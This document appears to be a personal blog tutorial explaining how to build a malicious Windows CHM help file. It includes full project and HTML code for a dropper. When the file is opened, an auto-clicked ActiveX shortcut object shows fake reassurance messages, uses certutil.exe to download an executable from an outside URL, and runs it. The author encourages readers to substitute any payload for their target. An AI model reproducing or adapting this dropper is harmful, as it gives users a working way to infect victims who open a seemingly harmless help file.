---
title: "Build Malicious CHM (Help) file"
tags:
- Malicious-CHM
---


Hey everyone. May have a nice day! So today I'm gonna explain how a help (.chm) file could be a malicious file in Windows machine.

First, we need to clarify what is .chm file and what its function.

Based on this [website](https://whatis.techtarget.com/fileformat/CHM-Compiled-HTML-file),

CHM is an extension for the Compiled HTML file format, most commonly used by Microsoft’s HTML-based help program. It may contain many compressed HTML documents and the images and JavaScript they link to. CHM features include a table of contents, index, and full text searching.

So, basically user will click this file to see program's manual, details and so on in windows. But, nowadays... only a few amount of people read (click) this CHM file . So, this malicious chm or attack may not cool enough to be a malicious file because of less uses in wild attacks nowadays hahaha.

Example of CHM file
![enter image description here](http://www.create-chm.com/content/pages/about-chm/images/chm-file-viewer.png)

So, how can this .chm file format can be malicious or how to make it malicious that can download file / execute  code?

Here a write-up on how to make a malicious "help documentation" (chm).

## Let's go!

To build a CHM file, first you need an HTML help project (.hhp) file which is a text configuration file.

Here is an example of .hhp file:
```
[OPTIONS]
Compatibility=1.1 or later
Compiled file=malicious.chm
Default topic=malicious.htm
Display compile progress=No
Language=0x410 Italian (Italy)

[FILES]
malicious.htm

[INFOTYPES]
``` 
Save it as `malicous.hhp`.

Next, create `.htm` file for our HTML source where this file will be our weapon to execute code.
I named it as `malicious.htm`.

Here is the content of the `malicious.htm` file:
```
<html>
<title> Malicious CHM </title>
<head>
</head>
<body>

<h2 align=center> Malicious CHM </h2>
<p>
<h3 align=center> This is a malicious CHM file </h3>
</p>
</body>
</html>

<OBJECT id=shortcut classid="clsid:52a2aaae-085d-4187-97ea-8c30db990436" width=1 height=1>
<PARAM name="Command" value="ShortCut">
<PARAM name="Button" value="Bitmap:shortcut">
<PARAM name="Item1" value=",cmd,/c echo HTML Help Executable may be stopped working... & echo Process is running, please don't close this... & certutil.exe -urlcache -split -f https://github.com/fareedfauzi/Testing/raw/master/malicious.exe c:\mal.exe & start c:\mal.exe">
<PARAM name="Item2" value="273,1,1">

</OBJECT>
<SCRIPT>
shortcut.Click();
</SCRIPT>
```

Ok now I'm gonna explain the execution code.

The execution code will happen in this line. Note here that, you can replace the execution code with your own desired. :)
```
<PARAM name="Item1" value=",cmd,/c echo HTML Help Executable may be stopped working... & echo Process is running, please don't close this... & certutil.exe -urlcache -split -f https://github.com/fareedfauzi/Testing/raw/master/malicious.exe c:\mal.exe & start c:\mal.exe">
```
The next line meaning that I tell the command prompt to print these words to user because the next command "`certutil.exe`" require some seconds to do its job. 

    echo HTML Help Executable may be stopped working... & echo Process is running, please don't close this...
    
The next line is "`certutil.exe`" command. Certutil.exe is a Windows binary used for handling certificates and also can work as our downloader agent to download our malicious binary. Refer [this](https://lolbas-project.github.io/lolbas/Binaries/Certutil/) for more detail about the binary.

```
certutil.exe -urlcache -split -f https://github.com/fareedfauzi/Testing/raw/master/malicious.exe c:\mal.exe
```
Because cerutil.exe takes some times to download our binary, the process execution will be slow too. This make our chm file will display "HTML Help Executable stopped working". If you replaced this code to make an only execution without downloading, CHM will work perfectly without prompting "stopped working" msgbox.

And last line is..
```
& start c:\mal.exe
```
Its function is too execute our malicious binary. 

You can replace the execution code with anything you want include execution of batch file, powershell and so forth (follow your creativity and target).

Now we have these files on our machine. So, the next step is to compile this file to generate our chm file.

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciouschm/maliciouschm2.PNG){: .align-center}

To generate the CHM file. You can do this using "HTML Help Workshop". 
Download at Official Microsoft website [here](https://www.microsoft.com/en-my/download/details.aspx?id=21138).

Open HTML Help Workshop ---> Go to `File` ---> Click `compile` ---> Choose our `.hhp` file. ---> HTML Help Workshop will compile for us and give us the malicious chm file.

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciouschm/maliciouschm11.PNG){: .align-center}

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciouschm/maliciouschm3.PNG){: .align-center}

Now double click on your help file to check it worked!

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciouschm/maliciouschm4.PNG){: .align-center}

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciouschm/maliciouschm5.PNG){: .align-center}

Now, our code is successfully execute. It download our binary and then start our malicious binary.

So, from here you can get a big picture on how chm file could be another hackers weapon to execute their code.

Orite, goodbye!
